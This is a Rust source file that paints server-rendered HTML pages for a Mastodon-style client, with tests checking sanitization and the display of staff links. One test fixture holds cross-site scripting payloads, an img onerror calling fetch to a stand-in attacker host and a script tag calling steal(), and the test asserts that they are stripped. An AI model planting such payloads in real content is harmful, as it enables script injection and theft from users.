//! The HTML a reader sees before any wasm runs.
//!
//! This is a *server-painted* page, not a hydrated Leptos tree: the same `index.html`
//! contract (one stylesheet, one module script, `data-theme`), the statuses as real markup,
//! and a JSON island the client adopts so it does not re-fetch what the server already
//! asked for. Hydration proper can come later; what matters first is that the first paint
//! is content rather than a spinner.
//!
//! Two rules hold the design together, both from `nodus-backend/docs/06-ssr.md`:
//!
//! - **No token in the output.** Not in the markup, not in the island. The island carries
//!   data and a cursor.
//! - **Unknown is not a default.** When the server has no session it paints the signed-out
//!   page; it never paints one account's page and lets the client swap it.

use leptos::prelude::Owner;
use leptos::tachys::html::element::InnerHtmlAttribute as _;
use leptos::tachys::view::RenderHtml as _;
use leptos::tachys::view::any_view::IntoAny as _;

use nodus_client_core::model::{Context, Status};

// The rows live beside the page builders: they are the parts a page is made of, and they are
// the only place markup is produced for them.
pub(crate) use crate::rows::*;

/// The assets `trunk` produced. Discovered at startup, because the names carry content
/// hashes: writing them down here would mean a stale page after every build.
#[derive(Debug, Clone)]
pub struct Assets {
    pub script: String,
    pub wasm: String,
    /// The stylesheet's path, kept so a deploy that changes only the CSS is visible.
    pub stylesheet: Option<String>,
    /// The stylesheet's contents, inlined into every page. One request fewer before
    /// the first paint, and no second asset whose hash can go stale during a deploy.
    pub stylesheet_css: Option<String>,
}

impl Assets {
    /// Whether the files this build discovered are still the ones on disk.
    ///
    /// `Caddy` serves `/srv/nodus` from the filesystem, so a static deploy replaces both the
    /// script and the wasm while this process keeps serving. Without this check the page
    /// keeps naming the previous bundle, the browser asks for a file that no longer exists,
    /// and the wasm never boots — the document stays server-painted and looks like SSR
    /// having replaced CSR.
    #[must_use]
    pub fn stale(&self, dist: &std::path::Path) -> bool {
        if !dist.join(&self.wasm).is_file() || !dist.join(&self.script).is_file() {
            return true;
        }
        self.stylesheet
            .as_ref()
            .is_some_and(|path| !dist.join(path).is_file())
    }

    /// Find the bundle in a `dist` directory. Falls back to trunk's stable names so a
    /// misconfigured path produces a page that still works rather than a 404 loop.
    pub fn discover(dist: &std::path::Path) -> Self {
        let mut script = None;
        let mut wasm = None;
        let mut stylesheet = None;
        let mut stylesheet_css = None;
        if let Ok(entries) = std::fs::read_dir(dist) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().into_owned();
                let path = std::path::Path::new(&name);
                let is_js = path
                    .extension()
                    .is_some_and(|extension| extension.eq_ignore_ascii_case("js"));
                let is_css = path
                    .extension()
                    .is_some_and(|extension| extension.eq_ignore_ascii_case("css"));
                let is_wasm = path
                    .extension()
                    .is_some_and(|extension| extension.eq_ignore_ascii_case("wasm"));
                if name.starts_with("nodus-web") && is_js {
                    script = Some(format!("/{name}"));
                } else if name.starts_with("nodus-web") && is_wasm {
                    wasm = Some(format!("/{name}"));
                } else if name.starts_with("tailwind") && is_css {
                    stylesheet = Some(format!("/{name}"));
                    stylesheet_css = std::fs::read_to_string(entry.path()).ok();
                }
            }
        }
        Self {
            script: script.unwrap_or_else(|| "/nodus-web.js".to_owned()),
            wasm: wasm.unwrap_or_else(|| "/nodus-web_bg.wasm".to_owned()),
            stylesheet,
            stylesheet_css,
        }
    }
}

/// Escapes text for HTML attributes and text nodes.
///
/// Status bodies are not escaped here any more: they are rewritten by [`crate::html`],
/// which keeps the parts of Mastodon's markup that a post is made of.
fn instance_meta() -> String {
    match std::env::var("NODUS_INSTANCE_HOST") {
        Ok(host) if !host.trim().is_empty() => format!(
            r#"<meta name="nodus-instance-host" content="{}">"#,
            escape(host.trim())
        ),
        _ => String::new(),
    }
}

/// Escapes text for HTML attributes and text nodes.
#[must_use]
pub fn escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for character in text.chars() {
        match character {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            other => out.push(other),
        }
    }
    out
}

/// The island: what the client should adopt rather than fetch.
#[derive(Debug, serde::Serialize)]
pub struct Island<'a> {
    pub which: &'a str,
    pub statuses: &'a [Status],
    pub cursor: Option<&'a str>,
}

/// The two doors a moderator has, drawn from the same list the client draws.
fn staff_doors(path: &str) -> leptos::prelude::AnyView {
    imperative::rail_rows(path)
}

/// Markup for the extra rail rows, kept beside the frame so both come from one place.
mod imperative {
    use leptos::prelude::*;

    /// The moderation and administration rows.
    #[must_use]
    pub fn rail_rows(path: &str) -> AnyView {
        let path = path.to_owned();
        view! {
            <nodus_ui::RailEntry
                label="Moderation"
                href="/moderation"
                hint="The queue, the accounts and what the server allows"
                icon=nodus_ui::icons::Icon::Shield
                active=Signal::derive({
                    let path = path.clone();
                    move || nodus_ui::within("/moderation", &path)
                })
            />
            <nodus_ui::RailEntry
                label="Administration"
                href="/admin"
                hint="What this instance publishes and allows"
                icon=nodus_ui::icons::Icon::Globe
                active=Signal::derive(move || nodus_ui::within("/admin", &path))
            />
        }
        .into_any()
    }
}

fn chrome_with_style(
    signed_in: bool,
    staff: bool,
    path: &str,
    inner: &str,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    use leptos::prelude::{IntoAny, Owner, Signal};

    // The frame, the rail and the icons come from `nodus-view`, the same components the
    // browser mounts. That is the whole point: two templates drift, one tree cannot.
    let path = path.to_owned();
    let door_path = path.clone();
    let inner = inner.to_owned();
    let style_prop = style.cloned().map(Signal::stored);
    Owner::new().with(|| {
        let body = inner.clone();
        nodus_ui::Frame(nodus_ui::FrameProps {
            signed_in: Signal::derive(move || signed_in),
            path: Signal::derive({
                let path = path.clone();
                move || path.clone()
            }),
            inner: std::sync::Arc::new(move || {
                leptos::html::div().inner_html(body.clone()).into_any()
            }),
            on_home: None,
            style: style_prop,
            // The browser fills the rail card in from the session it holds; a server render
            // has the cookie but not the account it names.
            profile: None,
            // The editor belongs to the browser: a server render has no draft to arrange and
            // no way to save it, so the painted page carries no handles.
            editor: None,
            on_pick: None,
            notice: None,
            on_save: None,
            on_cancel: None,
            // The rail's cards are reads the browser makes; the painted rail is the
            // navigation it already knows, and the card list arrives with hydration.
            sidebar: nodus_ui::components::sidebar::SidebarData::default().into(),
            extra: (signed_in && staff).then(move || {
                std::sync::Arc::new(move || staff_doors(&door_path)) as nodus_ui::ExtraDoors
            }),
        })
        .to_html()
    })
}

fn chrome(signed_in: bool, staff: bool, path: &str, inner: &str) -> String {
    chrome_with_style(signed_in, staff, path, inner, None)
}

/// The composer and the timeline tabs, drawn by the crate the client draws with.
///
/// The controls are the real ones, with verbs that do nothing until the wasm mount
/// brings the editor and the account's own SDK. The tab strip takes the route's path,
/// not the request's: Home lives at `/home`, and its siblings below it.
fn timeline_header(active: &str) -> String {
    use leptos::prelude::*;

    let here = active.to_owned();
    Owner::new().with(|| {
        nodus_pages::pages::compose::inline::ComposerPreview(
            nodus_pages::pages::compose::inline::preview::ComposerPreviewProps {
                active: Signal::derive(move || here.clone()),
            },
        )
        .to_html()
    })
}

/// The signed-in home page, painted.
#[cfg(test)]
pub fn home(
    assets: &Assets,
    acct: &str,
    staff: bool,
    statuses: &[Status],
    cursor: Option<&str>,
) -> String {
    home_with_style(assets, acct, staff, statuses, cursor, None)
}

/// The signed-in home page, painted with the active account's `SessionStyle`.
pub fn home_with_style(
    assets: &Assets,
    acct: &str,
    staff: bool,
    statuses: &[Status],
    cursor: Option<&str>,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    feed_with_style(
        assets, acct, staff, "home", "Home", "/home", statuses, cursor, style,
    )
}

/// A timeline page, painted: the same header, the same cards, the same island.
///
/// `which` is the client's own name for the timeline, so the island it adopts is the page
/// the reader is looking at rather than the home one.
#[cfg(test)]
#[expect(
    clippy::too_many_arguments,
    reason = "renders a feed document from request, session, and fetched timeline data"
)]
pub fn feed(
    assets: &Assets,
    acct: &str,
    staff: bool,
    which: &str,
    title: &str,
    path: &str,
    statuses: &[Status],
    cursor: Option<&str>,
) -> String {
    feed_with_style(
        assets, acct, staff, which, title, path, statuses, cursor, None,
    )
}

/// A timeline page painted with the active account's `SessionStyle`.
#[expect(
    clippy::too_many_arguments,
    reason = "renders a feed document from request, session, fetched timeline data, and style"
)]
pub fn feed_with_style(
    assets: &Assets,
    acct: &str,
    staff: bool,
    which: &str,
    title: &str,
    path: &str,
    statuses: &[Status],
    cursor: Option<&str>,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    let statuses: Vec<Status> = statuses
        .iter()
        .cloned()
        .map(|mut status| {
            nodus_ui::html::sanitize_status(&mut status);
            status
        })
        .collect();
    let island = serde_json::to_string(&Island {
        which,
        statuses: &statuses,
        cursor,
    })
    .unwrap_or_else(|_| format!("{{\"which\":\"{which}\",\"statuses\":[],\"cursor\":null}}"));
    let body = Owner::new().with(|| {
        let route = match which {
            "local" => nodus_web::shared::router::Route::Local,
            "federated" => nodus_web::shared::router::Route::Federated,
            _ => nodus_web::shared::router::Route::Home,
        };
        let card: nodus_ui::components::card_renderer::CardRenderer =
            std::sync::Arc::new(|status| {
                leptos::html::div()
                    .inner_html(status_card(&status))
                    .into_any()
            });
        let header: leptos::prelude::ChildrenFn = {
            let heading = timeline_header(path);
            std::sync::Arc::new(move || leptos::html::div().inner_html(heading.clone()).into_any())
        };
        nodus_route::route::RouteView(nodus_route::route::RouteViewProps {
            runtime: crate::runtime::StaticRuntime::page(statuses, cursor.map(str::to_owned)),
            route,
            card,
            header: Some(header),
            banner: None,
        })
        .to_html()
    });
    page_with_style(
        assets,
        &format!("{title} · {acct}"),
        &chrome_with_style(true, staff, path, &body, style),
        Some(&island),
        style,
        false,
    )
}

/// A thread rendered with the active account's `SessionStyle`.
#[must_use]
pub fn thread_page_with_style(
    assets: &Assets,
    acct: &str,
    staff: bool,
    status: &Status,
    context: &Context,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    let paint = |status: &Status| -> Status {
        let mut painted = status.clone();
        nodus_ui::html::sanitize_status(&mut painted);
        painted
    };
    let painted_context = Context {
        ancestors: context.ancestors.iter().map(&paint).collect(),
        descendants: context.descendants.iter().map(&paint).collect(),
    };
    crate::pages::render_thread_with_style(
        assets,
        acct,
        staff,
        &paint(status),
        &painted_context,
        style,
    )
}

/// Paints a page that is already a rendered component tree.
///
/// The client's screens and the server's screens are the same components; this is the seam
/// where the server's answer becomes a document. `title` is the browser tab's name, `inner`
/// the component's HTML, and the envelope is [`page`] either way.
#[cfg(test)]
pub fn page_of(
    assets: &Assets,
    acct: &str,
    staff: bool,
    path: &str,
    title: &str,
    inner: &str,
    island: Option<String>,
) -> String {
    page_of_with_style(assets, acct, staff, path, title, inner, island, None)
}

/// Paints a page component tree alongside the active account's `SessionStyle`.
#[expect(
    clippy::too_many_arguments,
    reason = "document envelope takes asset manifest, session state, route metadata, and style"
)]
pub fn page_of_with_style(
    assets: &Assets,
    acct: &str,
    staff: bool,
    path: &str,
    title: &str,
    inner: &str,
    island: Option<String>,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    page_with_style(
        assets,
        &format!("{title} · {acct}"),
        &chrome_with_style(true, staff, path, inner, style),
        island.as_deref(),
        style,
        false,
    )
}

/// A public page: the reader has no account, so the rail shows no signed-in doors.
pub fn page_of_public(
    assets: &Assets,
    path: &str,
    title: &str,
    inner: &str,
    noindex: bool,
) -> String {
    page(
        assets,
        title,
        &chrome(false, false, path, inner),
        None,
        noindex,
    )
}

/// The signed-out page, and the shell a signed-in reader gets before their data arrives.
pub fn landing(assets: &Assets) -> String {
    let inner = Owner::new().with(|| nodus_pages::pages::landing::LandingPage().to_html());
    page(
        assets,
        "Nodus",
        &chrome(false, false, "/", &inner),
        None,
        false,
    )
}

/// The shell for every route the client owns.
///
/// The home timeline cannot be painted for a screen the server does not implement (a
/// thread, a profile, the settings pages), so those routes get the chrome: the wordmark,
/// the navigation, and the note that says what is being opened. The client replaces the
/// body the moment it boots, and its store answers the screen from cache when it can.
/// Painting the chrome is still worth it — the reader sees the application, not a blank
/// document, while two megabytes of wasm arrive.
pub fn shell(assets: &Assets, acct: Option<&str>, staff: bool, path: &str) -> String {
    shell_with_style(assets, acct, staff, path, None)
}

pub fn shell_with_style(
    assets: &Assets,
    acct: Option<&str>,
    staff: bool,
    path: &str,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    use leptos::prelude::*;

    if acct.is_none() {
        // The client's gate, painted: a signed-out reader gets the form the client mounts,
        // with every verb absent until wasm arrives.
        let inner = Owner::new().with(|| {
            nodus_pages::pages::sign_in::SignInPage(nodus_pages::pages::sign_in::SignInPageProps {
                note: None,
                host: Signal::derive(String::new),
                token: Signal::derive(String::new),
                authorizing: Signal::derive(|| false),
                pasting: Signal::derive(|| false),
                authorize_error: Signal::derive(|| None),
                token_error: Signal::derive(|| None),
                startup_error: Signal::derive(|| None),
                on_host: None,
                on_token: None,
                on_authorize: None,
                on_token_submit: None,
            })
            .to_html()
        });
        return page(
            assets,
            "Sign in · Nodus",
            &chrome(false, false, path, &inner),
            None,
            false,
        );
    }

    crate::pages::render_unclaimed_with_style(assets, acct.unwrap_or_default(), staff, path, style)
}

#[cfg(test)]
pub fn error(assets: &Assets, staff: bool, message: &str) -> String {
    error_with_style(assets, staff, message, None)
}

pub fn error_with_style(
    assets: &Assets,
    staff: bool,
    message: &str,
    style: Option<&nodus_ui::session_style::SessionStyle>,
) -> String {
    let inner = Owner::new().with(|| {
        nodus_pages::pages::shell::TimelineError(nodus_pages::pages::shell::TimelineErrorProps {
            message: message.to_owned(),
        })
        .to_html()
    });
    page_with_style(
        assets,
        "Timeline unavailable",
        &chrome_with_style(true, staff, "/home", &inner, style),
        None,
        style,
        false,
    )
}

/// The shell both pages share: the app's stylesheet, its bundle, and the island.
fn page(assets: &Assets, title: &str, body: &str, island: Option<&str>, noindex: bool) -> String {
    page_with_style(assets, title, body, island, None, noindex)
}

fn page_with_style(
    assets: &Assets,
    title: &str,
    body: &str,
    island: Option<&str>,
    style: Option<&nodus_ui::session_style::SessionStyle>,
    noindex: bool,
) -> String {
    let stylesheet = match (&assets.stylesheet_css, &assets.stylesheet) {
        (Some(css), _) => format!("<style>{}</style>", css.replace("</style", "<\\/style")),
        (None, Some(href)) => format!("<link rel=\"stylesheet\" href=\"{}\">", escape(href)),
        (None, None) => String::new(),
    };
    let island = island
        .map(|json| {
            format!(
                "<script id=\"nodus-page\" type=\"application/json\">{}</script>",
                json.replace("</", "<\\/")
            )
        })
        .unwrap_or_default();
    let style_island = style
        .map(|s| {
            format!(
                "<script id=\"nodus-session-style\" type=\"application/json\">{}</script>",
                s.to_safe_json_island()
            )
        })
        .unwrap_or_default();
    format!(
        "<!doctype html>\
         <html lang=\"en\" data-theme=\"light\">\
           <head>\
             <meta charset=\"utf-8\">\
             <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\
             {instance}\
             <link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%230f172a'/%3E%3Ctext x='16' y='23' font-family='system-ui' font-size='20' font-weight='700' text-anchor='middle' fill='%23fff'%3En%3C/text%3E%3C/svg%3E\">\
             <title>{title}</title>\
             {robots}\
             <script>(function(){{var d=window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches;document.documentElement.dataset.theme=d?'dark':'light';}})()</script>\
             {stylesheet}\
             <script type=\"module\">\
               import init, * as bindings from '{script}';\
               await init({{ module_or_path: '{wasm}' }});\
               window.wasmBindings = bindings;\
             </script>\
           </head>\
           <body class=\"min-h-screen bg-base-200\">\
             <div id=\"app\">{body}</div>\
             {island}\
             {style_island}\
           </body>\
         </html>",
        title = escape(title),
        instance = instance_meta(),
        robots = if noindex {
            "<meta name=\"robots\" content=\"noindex, nofollow\">"
        } else {
            ""
        },
        script = escape(&assets.script),
        wasm = escape(&assets.wasm),
    )
}

#[cfg(test)]
mod tests {
    use nodus_client_core::model::{Account, CustomEmoji, Status, Visibility};

    use super::*;

    fn test_assets() -> Assets {
        Assets {
            script: "/nodus-web.js".to_owned(),
            wasm: "/nodus-web_bg.wasm".to_owned(),
            stylesheet: None,
            stylesheet_css: None,
        }
    }

    #[test]
    fn feed_sanitizes_nodus_page_island_and_prevents_emoji_breakout() {
        let assets = test_assets();
        let status = Status {
            id: "1".to_owned(),
            created_at: "2026-01-01T00:00:00Z".to_owned(),
            content: "<p>hi :wave: <a href=\"https://example.com/:wave:\">link</a></p>\
                      <img src=x onerror=\"fetch('https://attacker.tld')\">"
                .to_owned(),
            visibility: Visibility::Public,
            account: Account {
                id: "1".to_owned(),
                acct: "alice@example.org".to_owned(),
                display_name: "Alice".to_owned(),
                note: "<p>bio</p><script>steal()</script>".to_owned(),
                avatar: String::new(),
                header: String::new(),
                bot: false,
                locked: false,
                followers_count: 0,
                following_count: 0,
                statuses_count: 0,
                last_status_at: None,
                discoverable: None,
                indexable: None,
                noindex: None,
            },
            favourites_count: 0,
            reblogs_count: 0,
            replies_count: 0,
            favourited: false,
            reblogged: false,
            bookmarked: false,
            reblog: None,
            in_reply_to_id: None,
            emojis: vec![CustomEmoji {
                shortcode: "wave".to_owned(),
                url: "https://cdn.test/wave.png".to_owned(),
                static_url: None,
            }],
            url: None,
            sensitive: false,
            spoiler_text: String::new(),
            language: None,
            content_format: None,
            content_source: None,
            media_attachments: Vec::new(),
            mentions: Vec::new(),
            tags: Vec::new(),
            poll: None,
            edited_at: None,
            pinned: None,
        };

        let html = feed(
            &assets,
            "me@example.org",
            false,
            "home",
            "Home",
            "/home",
            &[status],
            None,
        );
        let (_, after_open) = html
            .split_once("<script id=\"nodus-page\" type=\"application/json\">")
            .expect("island script present");
        let (island_json, _) = after_open.split_once("</script>").expect("closing script");

        assert!(!island_json.contains("onerror"), "{island_json}");
        assert!(!island_json.contains("attacker.tld"), "{island_json}");
        assert!(!island_json.contains("<script"), "{island_json}");
        assert!(!island_json.contains("steal()"), "{island_json}");
        assert!(
            html.contains("href=\"https://example.com/:wave:\""),
            "{html}"
        );
    }

    fn has_staff_links(html: &str) -> bool {
        html.contains("href=\"/moderation\"") || html.contains("href=\"/admin\"")
    }

    #[test]
    fn staff_links_follow_explicit_flag_only() {
        let assets = test_assets();

        // Staff renders include moderation and administration links.
        let staff_home = home(&assets, "mod@example.com", true, &[], None);
        assert!(staff_home.contains("href=\"/moderation\""));
        assert!(staff_home.contains("href=\"/admin\""));

        let staff_feed = feed(
            &assets,
            "mod@example.com",
            true,
            "local",
            "Local",
            "/home/local",
            &[],
            None,
        );
        assert!(staff_feed.contains("href=\"/moderation\""));
        assert!(staff_feed.contains("href=\"/admin\""));

        let staff_page = page_of(
            &assets,
            "mod@example.com",
            true,
            "/lists",
            "Lists",
            "<p/>",
            None,
        );
        assert!(staff_page.contains("href=\"/moderation\""));
        assert!(staff_page.contains("href=\"/admin\""));

        let staff_shell = shell(&assets, Some("mod@example.com"), true, "/settings/account");
        assert!(staff_shell.contains("href=\"/moderation\""));
        assert!(staff_shell.contains("href=\"/admin\""));

        let staff_error = error(&assets, true, "unavailable");
        assert!(staff_error.contains("href=\"/moderation\""));
        assert!(staff_error.contains("href=\"/admin\""));

        // Non-staff and public renders immediately after never include staff links.
        assert!(!has_staff_links(&home(
            &assets,
            "user@example.com",
            false,
            &[],
            None
        )));
        assert!(!has_staff_links(&feed(
            &assets,
            "user@example.com",
            false,
            "local",
            "Local",
            "/home/local",
            &[],
            None,
        )));
        assert!(!has_staff_links(&page_of(
            &assets,
            "user@example.com",
            false,
            "/lists",
            "Lists",
            "<p/>",
            None,
        )));
        assert!(!has_staff_links(&shell(
            &assets,
            Some("user@example.com"),
            false,
            "/settings/account",
        )));
        assert!(!has_staff_links(&error(&assets, false, "unavailable")));
        assert!(!has_staff_links(&shell(&assets, None, true, "/sign-in")));
        assert!(!has_staff_links(&landing(&assets)));
        assert!(!has_staff_links(&page_of_public(
            &assets,
            "/status/example.com/1",
            "Post",
            "<p/>",
            false,
        )));
    }
}
